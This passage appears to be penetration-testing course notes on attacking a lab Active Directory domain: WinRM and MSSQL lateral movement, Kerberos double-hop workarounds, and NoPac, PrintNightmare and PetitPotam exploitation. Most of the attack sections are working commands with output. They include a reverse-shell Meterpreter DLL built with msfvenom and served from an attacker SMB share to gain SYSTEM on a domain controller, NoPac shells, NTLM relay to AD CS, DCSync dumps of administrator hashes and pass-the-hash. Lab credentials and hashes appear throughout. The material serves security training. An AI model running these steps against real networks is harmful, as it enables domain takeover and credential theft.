+
+ComputerName : ACADEMY-EA-MS01
+GroupName    : Remote Management Users
+MemberName   : INLANEFREIGHT\forend
+SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
+IsGroup      : False
+IsDomain     : UNKNOWN
+```
+
+**Explanation:**
+- The **Remote Management Users** group was introduced in Windows 8/Server 2012 to grant WinRM access without requiring local admin rights.
+- The output shows the user `forend` has WinRM access to MS01.
+
+---
+
+### BloodHound Cypher Query for WinRM Users
+
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
+```
+
+**Explanation:**
+- This custom Cypher query finds all users who can connect via WinRM, either directly or through group membership.
+- Paste it into the **Raw Query** box at the bottom of the BloodHound GUI and hit Enter.
+- It can be saved as a custom query so it's always available during assessments.
+
+---
+
+### Establishing WinRM Session from Windows
+
+```powershell
+PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
+PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
+PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
+
+[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
+ACADEMY-EA-MS01
+[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
+PS C:\htb>
+```
+
+**Explanation:**
+- Creates a credential object for `forend` and establishes an interactive WinRM session on MS01.
+- The `hostname` command confirms we are on the remote host.
+- Use `Exit-PSSession` to return to the local session.
+
+---
+
+### Installing Evil-WinRM (Linux)
+
+```bash
+$ gem install evil-winrm
+```
+
+**Explanation:**
+- Installs the Evil-WinRM tool via Ruby's gem package manager.
+
+### Viewing Evil-WinRM's Help Menu
+
+```bash
+$ evil-winrm
+
+Evil-WinRM shell v3.3
+
+Error: missing argument: ip, user
+
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
+    -S, --ssl                        Enable ssl
+    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf
+    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
+    -e, --executables EXES_PATH      C# executables local path
+    -i, --ip IP                      Remote host IP or hostname (required)
+    -U, --url URL                    Remote url endpoint (default /wsman)
+    -u, --user USER                  Username (required if not using kerberos)
+    -p, --password PASS              Password
+    -H, --hash HASH                  NTHash
+    -P, --port PORT                  Remote host port (default 5985)
+    -V, --version                    Show version
+    -n, --no-colors                  Disable colors
+    -N, --no-rpath-completion        Disable remote path completion
+    -l, --log                        Log the WinRM session
+    -h, --help                       Display this help message
+```
+
+**Explanation:**
+- Key flags: `-i` (target IP), `-u` (username), `-p` (password), `-H` (NT hash for Pass-the-Hash), `-S` (SSL), `-P` (port, default 5985).
+
+---
+
+### Connecting to a Target with Evil-WinRM and Valid Credentials
+
+```bash
+$ evil-winrm -i 10.129.201.234 -u forend
+
+Enter Password:
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
+ACADEMY-EA-MS01
+```
+
+**Explanation:**
+- Connect with just an IP address and valid credentials — Evil-WinRM prompts for the password.
+- A successful connection drops into a PowerShell session on the remote host.
+
+---
+
+## 21.4 SQL Server Admin Access
+
+SQL server credentials are commonly found via **Kerberoasting**, **LLMNR/NBT-NS Response Spoofing**, **password spraying**, or with the tool **Snaffler** which searches for `web.config` or configuration files containing SQL Server connection strings. SQL sysadmin access almost always translates to **SYSTEM-level OS access** via `xp_cmdshell` due to `SeImpersonatePrivilege`.
+
+### BloodHound Cypher Query for SQL Admin Rights
+
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+
+**Explanation:**
+- This custom Cypher query finds all users with SQLAdmin rights over a computer.
+- In the example environment, `damundsen` has SQLAdmin rights over `ACADEMY-EA-DB01`.
+- We can use our ACL rights to change `damundsen`'s password and then authenticate to the SQL server.
+
+---
+
+### Enumerating MSSQL Instances with PowerUpSQL
+
+```powershell
+PS C:\htb> cd .\PowerUpSQL\
+PS C:\htb> Import-Module .\PowerUpSQL.ps1
+PS C:\htb> Get-SQLInstanceDomain
+
+ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
+Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
+DomainAccountSid : 1500000521000170152142291832437223174127203170152400
+DomainAccount    : damundsen
+DomainAccountCn  : Dana Amundsen
+Service          : MSSQLSvc
+Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
+LastLogon        : 4/6/2022 11:59 AM
+```
+
+**Explanation:**
+- `Get-SQLInstanceDomain` scans the domain for all SQL Server instances registered via SPNs in Active Directory.
+- Output shows `ACADEMY-EA-DB01` is running SQL Server on port 1433, using the `damundsen` service account.
+
+---
+
+### Querying SQL Server Using PowerUpSQL (Get-SQLQuery)
+
+```powershell
+PS C:\htb> Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+VERBOSE: 172.16.5.150,1433 : Connection Success.
+
+Column1
+-------
+Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
+```
+
+**Explanation:**
+- `Get-SQLQuery` authenticates to the SQL Server instance and executes the query.
+- `Connection Success` confirms valid credentials and connectivity.
+- `Select @@version` is a simple test query to confirm the SQL Server version.
+
+---
+
+### Displaying mssqlclient.py Options (Linux)
+
+```bash
+$ mssqlclient.py
+
+Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
+
+usage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE] [-hashes LMHASH:NTHASH]
+                      [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]
+                      target
+
+TDS client implementation (SSL supported).
+
+positional arguments:
+  target                [[domain/]username[:password]@]<targetName or address>
+
+<SNIP>
+```
+
+**Explanation:**
+- Key flags: `-windows-auth` (use Windows authentication instead of SQL auth), `-hashes` (Pass-the-Hash), `-k` (Kerberos auth), `-no-pass` (use cached credentials).
+
+---
+
+### Running mssqlclient.py Against the Target
+
+```bash
+$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+```
+
+**Explanation:**
+- `-windows-auth` authenticates using Windows credentials (domain\username format).
+- Successful connection drops into an SQL prompt.
+
+---
+
+### Viewing Our Options with Access to the SQL Server
+
+```bash
+SQL> help
+
+     lcd {path}                 - changes the current local directory to {path}
+     exit                       - terminates the server process (and this session)
+     enable_xp_cmdshell         - you know what it means
+     disable_xp_cmdshell        - you know what it means
+     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+     ! {cmd}                    - executes a local shell cmd
+```
+
+**Explanation:**
+- `help` lists all available mssqlclient.py shell commands.
+- `enable_xp_cmdshell` is the key command that enables OS command execution via the database.
+
+---
+
+### Choosing enable_xp_cmdshell
+
+```bash
+SQL> enable_xp_cmdshell
+
+[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+```
+
+**Explanation:**
+- Enables the `xp_cmdshell` stored procedure on the SQL Server.
+- This is only possible if the account has sysadmin rights.
+- The two INFO lines confirm both `show advanced options` and `xp_cmdshell` were enabled and reconfigured.
+
+---
+
+### Enumerating Our Rights on the System Using xp_cmdshell
+
+```bash
+SQL> xp_cmdshell whoami /priv
+output
+
+--------------------------------------------------------------------------------
+
+NULL
+
+PRIVILEGES INFORMATION
+----------------------
+
+NULL
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+NULL
+```
+
+**Explanation:**
+- `xp_cmdshell whoami /priv` runs `whoami /priv` on the OS through the SQL Server service account context.
+- **`SeImpersonatePrivilege` is Enabled** — this is the critical finding. Combined with tools like **JuicyPotato**, **PrintSpoofer**, or **RoguePotato**, this privilege can be leveraged to escalate to `NT AUTHORITY\SYSTEM` on the host, depending on the OS version.
+- These escalation techniques are covered in the **Windows Privilege Escalation module** (SeImpersonate and SeAssignPrimaryToken sections).
+
+---
+
+## 21.5 Moving On — Key Takeaways
+
+This section demonstrated a few possible lateral movement techniques in an Active Directory environment. Key points to remember:
+
+- Always look for RDP, WinRM, and SQLAdmin rights when gaining initial footholds and additional user accounts.
+- Enumerating and attacking is an **iterative process** — every time a new user or host is compromised, repeat enumeration steps to identify new rights.
+- Never overlook remote access rights even if the user is not a local admin — a WinRM or RDP session may reveal sensitive data or a privilege escalation path.
+- Whenever SQL credentials are found (in scripts, `web.config` files, or DB connection strings), always test them against MSSQL servers. SQL sysadmin access is almost always **guaranteed SYSTEM access** over the host via `SeImpersonatePrivilege`.
+
+---
+
+# 22. Kerberos "Double Hop" Problem
+
+## 22.1 Background and Explanation
+
+The "Double Hop" problem is a Kerberos authentication limitation that arises when an attacker attempts to use WinRM/PowerShell to authenticate across two or more systems. When a user authenticates via WinRM using Kerberos, they receive only a TGS (Ticket Granting Service) ticket for that specific service — their TGT (Ticket Granting Ticket) is not forwarded. Without the TGT being cached on the remote system, any subsequent attempt to access a third system (such as a Domain Controller for LDAP queries) fails because Kerberos cannot prove the user's identity for the second hop.
+
+This contrasts with NTLM-based authentication methods like PSExec, where the user's NTLM hash is stored in memory and can be used for further authentication. The double hop problem manifests as errors like "An operations error occurred" when trying to run tools like PowerView from a WinRM session. It is confirmed by running `klist` in the remote session and seeing only one cached ticket (for the current connection), not a full TGT.
+
+---
+
+## 22.2 Workaround #1 — PSCredential Object
+
+When connected via Evil-WinRM, pass credentials explicitly with each command:
+
+```powershell
+*Evil-WinRM* PS> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+*Evil-WinRM* PS> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
+*Evil-WinRM* PS> get-domainuser -spn -credential $Cred | select samaccountname
+```
+
+**Explanation:**
+- By creating a `PSCredential` object and passing it with `-Credential $Cred` to PowerView commands, the credentials are explicitly included in the LDAP query to the Domain Controller, bypassing the double hop limitation.
+- Without `-Credential`, the same command fails because the WinRM session has no TGT to authenticate with the DC.
+
+---
+
+## 22.3 Workaround #2 — Register PSSession Configuration
+
+This method works when using a proper Windows console (not Evil-WinRM) and creates a persistent session configuration that avoids the double hop issue.
+
+### Register the Session
+
+```powershell
+PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
+```
+
+**Explanation:**
+- `Register-PSSessionConfiguration` creates a new named session endpoint on the local machine.
+- `-RunAsCredential inlanefreight\backupadm` configures the session to run all commands under the specified user's credentials, which are fully cached.
+- This triggers a WinRM service restart, disconnecting existing sessions.
+
+---
+
+### Restart WinRM and Connect Using the Named Session
+
+```powershell
+PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess
+```
+
+**Explanation:**
+- `-ConfigurationName backupadmsess` tells the system to use the registered session configuration.
+- The local machine now impersonates the remote machine in the context of `backupadm`, and the TGT is fully available, as confirmed by running `klist` and seeing a `krbtgt` ticket cached.
+- PowerView commands can now be run without `-Credential` flags.
+
+> **Note:** This method cannot be used from an Evil-WinRM shell (requires GUI/elevated PowerShell) and has limitations on Linux attack hosts.
+
+---
+
+# 23. Bleeding Edge Vulnerabilities
+
+## 23.1 Introduction and Safety Considerations
+
+These three vulnerabilities are relatively recent (within 6–9 months of April 2022). They are advanced topics that cannot be covered thoroughly in one section. The purpose is to allow students to practice these attacks in a controlled lab environment. As with any attack, **if you do not understand how these work or the risk they could pose to a production environment, do not attempt them during a real-world engagement.**
+
+These techniques are considered "safe" and less destructive than attacks such as Zerologon or DCShadow, but all attacks carry risk. For example, **PrintNightmare could crash the print spooler service** on a remote host, causing a service disruption. Always exercise caution, take detailed notes, and communicate with clients.
+
+> **Scenario Setup:** All examples are performed from the **ATTACK01 Linux attack host** (SSH in). For Windows-based demonstrations (Rubeus and Mimikatz), use the MS01 host from the Privileged Access section.
+
+---
+
+## 23.2 NoPac (SamAccountName Spoofing) — CVE-2021-42278 & CVE-2021-42287
+
+NoPac exploits two chained CVEs allowing a standard domain user to escalate to Domain Admin in a single command.
+
+| CVE | Description |
+|---|---|
+| **CVE-2021-42278** | A bypass vulnerability in the Security Account Manager (SAM) |
+| **CVE-2021-42287** | A vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS |
+
+The attack works by renaming a newly created computer account to match a Domain Controller's `sAMAccountName`, then requesting Kerberos tickets — the KDC issues a TGT under the DC's name instead of the new name. This grants SYSTEM-level access on the DC. NoPac uses many Impacket tools internally.
+
+### Ensuring Impacket is Installed and Cloning NoPac
+
+```bash
+$ git clone https://github.com/SecureAuthCorp/impacket.git
+$ python setup.py install
+$ git clone https://github.com/Ridter/noPac.git
+```
+
+**Explanation:**
+- Clones and installs Impacket, then clones the NoPac exploit repository.
+- NoPac is present on the ATTACK01 host at `/opt/noPac`.
+
+---
+
+### Scanning for NoPac
+
+```bash
+$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+
+███    ██  ██████  ██████   █████   ██████
+████   ██ ██    ██ ██   ██ ██   ██ ██
+██ ██  ██ ██    ██ ██████  ███████ ██
+██  ██ ██ ██    ██ ██      ██   ██ ██
+██   ████  ██████  ██      ██   ██  ██████
+
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
+[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663
+```
+
+**Explanation:**
+- `scanner.py` attempts to obtain a TGT with a PAC from the DC — success means the system is vulnerable.
+- `ms-DS-MachineAccountQuota = 10` — authenticated users can add up to 10 computers to the domain, which is required for this attack. If an admin sets this to **0**, the attack fails.
+
+---
+
+### Running NoPac and Getting a Shell
+
+```bash
+$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] will try to impersonat administrator
+[*] Adding Computer Account "WIN-LWJFQMAXRVN$"
+[*] MachineAccount "WIN-LWJFQMAXRVN$" password = &A#x8X^5iLva
+[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &A#x8X^5iLva.
+[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01
+[*] Saving ticket in ACADEMY-EA-DC01.ccache
+[*] Resting the machine account to WIN-LWJFQMAXRVN$
+[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*] Saving ticket in administrator.ccache
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>
+```
+
+**Explanation:**
+- `-shell` drops into a semi-interactive shell via `smbexec.py`. Use **exact paths** instead of `cd` since smbexec doesn't support directory navigation.
+- `--impersonate administrator` specifies the account to impersonate.
+- The tool adds a fake computer account, renames it to match the DC's `sAMAccountName`, requests a TGT under the DC's name, then restores the original name.
+- `.ccache` files are saved to disk — usable for pass-the-ticket or DCSync attacks.
+
+---
+
+### Confirming the Location of Saved Tickets
+
+```bash
+$ ls
+
+administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
+README.md  scanner.py
+```
+
+**Explanation:**
+- The `.ccache` file can be used to perform a pass-the-ticket attack for further access such as DCSync.
+
+---
+
+### Using noPac to DCSync the Built-in Administrator Account
+
+```bash
+$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Kerberos keys grabbed
+inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
+inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
+[*] Cleaning up...
+```
+
+**Explanation:**
+- `-dump` triggers a DCSync internally using `secretsdump.py`.
+- `-just-dc-user INLANEFREIGHT/administrator` limits the dump to the administrator account only.
+- A `.ccache` file is still created on disk — note this for cleanup.
+
+---
+
+### Windows Defender and SMBEXEC.py Considerations
+
+If Windows Defender (or another AV/EDR) is enabled on the target, the shell session may be established but commands will likely fail. The first thing `smbexec.py` does is create a service called **BTOBTO**. Another service **BTOBO** is created for each command — each command is sent over SMB inside a `.bat` file called `execute.bat`. With each new command, a new batch script is created, echoed to a temp file, executed, and deleted. Windows Defender detects this as **VirTool:Win32/MSPSEexecCommand** (alert level: Severe).
+
+> **Opsec note:** If being "quiet" is a priority, avoid `smbexec.py`-based tools like NoPac's `-shell` option. Use the `-dump` flag instead for DCSync without spawning a shell.
+
+---
+
+## 23.3 PrintNightmare — CVE-2021-34527 & CVE-2021-1675
+
+PrintNightmare exploits vulnerabilities in the Windows **Print Spooler** service running on all Windows systems. The remote code execution variant can give an attacker a SYSTEM shell on a Domain Controller. Uses `cube0x0`'s exploit.
+
+### Cloning the Exploit and Installing cube0x0's Impacket
+
+```bash
+$ git clone https://github.com/cube0x0/CVE-2021-1675.git
+
+$ pip3 uninstall impacket
+$ git clone https://github.com/cube0x0/impacket
+$ cd impacket
+$ python3 ./setup.py install
+```
+
+**Explanation:**
+- This exploit requires **cube0x0's specific version of Impacket** — uninstall the standard version first.
+- cube0x0's Impacket is pre-installed on the ATTACK01 host.
+
+---
+
+### Enumerating for MS-RPRN (Print Protocols)
+
+```bash
+$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
+Protocol: [MS-RPRN]: Print System Remote Protocol
+```
+
+**Explanation:**
+- Confirms that both print protocols are exposed on the target DC — the target is likely vulnerable.
+
+---
+
+### Generating a DLL Payload
+
+```bash
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of dll file: 8704 bytes
+```
+
+**Explanation:**
+- `msfvenom` generates a 64-bit Windows reverse Meterpreter DLL payload.
+- `LHOST` is our attack host IP; `LPORT` is the port our MSF listener will catch the callback on.
+
+---
+
+### Creating a Share with smbserver.py
+
+```bash
+$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+```
+
+**Explanation:**
+- `-smb2support` enables SMB2 support (required for modern Windows targets).
+- Creates a share named `CompData` hosting the DLL file so the target DC can access it.
+
+---
+
+### Configuring and Starting MSF multi/handler
+
+```bash
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
+LHOST => 172.16.5.225
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
+LPORT => 8080
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+
+[*] Started reverse TCP handler on 172.16.5.225:8080
+```
+
+**Explanation:**
+- Configures a Metasploit multi/handler to catch the reverse shell when the DC executes the DLL.
+- Must match the `LHOST`/`LPORT` values used in `msfvenom`.
+
+---
+
+### Running the Exploit
+
+```bash
+$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+
+[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
+[+] Bind OK
+[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
+[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
+[*] Try 1...
+[*] Stage0: 0
+[*] Try 2...
+<SNIP>
+```
+
+**Explanation:**
+- Connects to the print spooler via `\PIPE\spoolss` and triggers the DC to load the DLL from our SMB share.
+- The path format at the end of the command is `\\<attack host IP>\ShareName\payload.dll`.
+
+---
+
+### Getting the SYSTEM Shell
+
+```bash
+[*] Sending stage (200262 bytes) to 172.16.5.5
+[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048) at 2022-03-29 13:06:20 -0400
+
+(Meterpreter 1)(C:\Windows\system32) > shell
+Process 5912 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+**Explanation:**
+- The Meterpreter session confirms SYSTEM-level access on the DC starting from just a standard domain user account.
+- `whoami` confirms `nt authority\system` — full control of the Domain Controller.
+
+---
+
+## 23.4 PetitPotam (MS-EFSRPC) — CVE-2021-36942
+
+PetitPotam coerces a Domain Controller to authenticate to an attacker-controlled host via NTLM over the MS-EFSRPC protocol. When AD CS is present, the relayed authentication requests a DC certificate from the CA, which is then used to request a TGT for the DC — enabling full domain compromise via DCSync.
+
+There is also an executable version for Windows, and the trigger is available in Mimikatz (`misc::efs /server:<DC> /connect:<ATTACK HOST>`) and as `Invoke-PetitPotam.ps1`.
+
+---
+
+### Starting ntlmrelayx.py Targeting AD CS
+
+```bash
+$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTP loaded..
+...
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+[*] Setting up WCF Server
+[*] Servers started, waiting for connections
+```
+
+**Explanation:**
+- Relays incoming NTLM authentication to the CA's Web Enrollment page to request a certificate.
+- `--adcs` enables the AD CS relay attack mode.
+- `--template DomainController` uses the Domain Controller certificate template.
+- If the CA location is unknown, use a tool such as `certi` to locate it.
+
+---
+
+### Running PetitPotam.py (Coercing DC Authentication)
+
+```bash
+$ python3 PetitPotam.py 172.16.5.225 172.16.5.5
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+```
+
+**Explanation:**
+- First argument (`172.16.5.225`) is the attacker's host running `ntlmrelayx.py`.
+- Second argument (`172.16.5.5`) is the target Domain Controller.
+- Abuses `EfsRpcOpenFileRaw` via the LSARPC pipe to coerce DC authentication.
+- `Attack worked!` confirms the DC was coerced successfully.
+
+---
+
+### Catching the Base64 Encoded Certificate for DC01
+
+Back in the `ntlmrelayx.py` window, a successful relay produces a base64 certificate:
+
+```bash
+[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE!
+[*] Base64 certificate of user ACADEMY-EA-DC01$:
+MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaD... <SNIP>
+```
+
+**Explanation:**
+- The relay succeeds and `ntlmrelayx.py` requests a certificate for the DC machine account (`ACADEMY-EA-DC01$`) from the CA.
+- The base64-encoded certificate is saved and used in the next step.
+
+---
+
+### Requesting a TGT Using gettgtpkinit.py
+
+```bash
+$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
+
+INFO:minikerberos:Loading certificate and key from file
+INFO:minikerberos:Requesting TGT
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
+INFO:minikerberos:Saved TGT to file
+```
+
+**Explanation:**
+- Uses **PKINIT** (certificate-based Kerberos pre-authentication) to exchange the certificate for a TGT for the DC machine account.
+- Saves the TGT as `dc01.ccache`.
+- **Save the AS-REP encryption key** (`70f805f...`) — needed for `getnthash.py` later.
+
+---
+
+### Setting the KRB5CCNAME Environment Variable
+
+```bash
+$ export KRB5CCNAME=dc01.ccache
+```
+
+**Explanation:**
+- Tells Kerberos tools to use `dc01.ccache` for all authentication attempts.
+
+---
+
+### Using Domain Controller TGT to DCSync
+
+```bash
+$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Kerberos keys grabbed
+inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
+inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
+inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
+[*] Cleaning up...
+```
+
+**Explanation:**
+- `-k -no-pass` uses the Kerberos ticket from the `KRB5CCNAME` env variable (no password needed).
+- Successfully dumps the administrator's NTLM hash via DCSync using the DC machine account's TGT.
+
+---
+
+### Running klist to Confirm the Ticket
+
+```bash
+$ klist
+
+Ticket cache: FILE:dc01.ccache
+Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL
+
+Valid starting       Expires              Service principal
+04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+```
+
+**Explanation:**
+- Confirms the TGT for `ACADEMY-EA-DC01$` is in the cache and valid.
+
+---
+
+### Confirming Admin Access to the Domain Controller
+
+```bash
+$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
+
+SMB  172.16.5.5  445  ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
